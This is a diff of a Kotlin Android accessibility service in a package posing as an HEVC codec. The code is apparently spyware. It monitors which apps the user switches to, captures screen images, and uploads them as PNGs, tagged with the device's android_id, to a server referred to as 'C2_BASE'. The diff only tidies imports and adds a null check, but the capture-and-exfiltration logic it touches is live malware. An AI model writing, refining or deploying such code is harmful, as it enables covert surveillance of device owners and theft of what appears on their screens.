@@ -3,10 +3,13 @@ package com.hevc.codec
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Intent
+import android.graphics.Bitmap
+import android.media.ImageReader
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import java.net.HttpURLConnection
+import java.net.URL
 
 class AgentAccessibilityService : AccessibilityService() {
 
@@ -14,14 +17,15 @@ class AgentAccessibilityService : AccessibilityService() {
         super.onServiceConnected()
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
-                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-            windowContentTimeout = 500
+            notificationTimeout = 500
         }
         Log.d("AgentA11y", "Connected - monitoring app switches")
     }
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent) {
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null) return
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             val pkgName = event.packageName?.toString() ?: return
 
@@ -55,27 +59,27 @@ class AgentAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun captureFromReader(reader: android.media.ImageReader): android.graphics.Bitmap? {
+    private fun captureFromReader(reader: ImageReader): Bitmap? {
         val image = reader.acquireLatestImage() ?: return null
         val plane = image.planes[0]
         val buffer = plane.buffer
-        val bitmap = android.graphics.Bitmap.createBitmap(
-            image.width, image.height, android.graphics.Bitmap.Config.ARGB_8888
+        val bitmap = Bitmap.createBitmap(
+            image.width, image.height, Bitmap.Config.ARGB_8888
         )
         bitmap.copyPixelsFromBuffer(buffer)
         image.close()
         return bitmap
     }
 
-    private fun uploadToServer(bitmap: android.graphics.Bitmap) {
+    private fun uploadToServer(bitmap: Bitmap) {
         try {
             val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
-            val conn = java.net.URL("${AgentService.C2_BASE}/screenshot/$deviceId")
+            val conn = URL("${AgentService.C2_BASE}/screenshot/$deviceId")
                 .openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
             conn.outputStream.use {
-                bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 80, it)
+                bitmap.compress(Bitmap.CompressFormat.PNG, 80, it)
             }
             conn.responseCode
         } catch (e: Exception) {
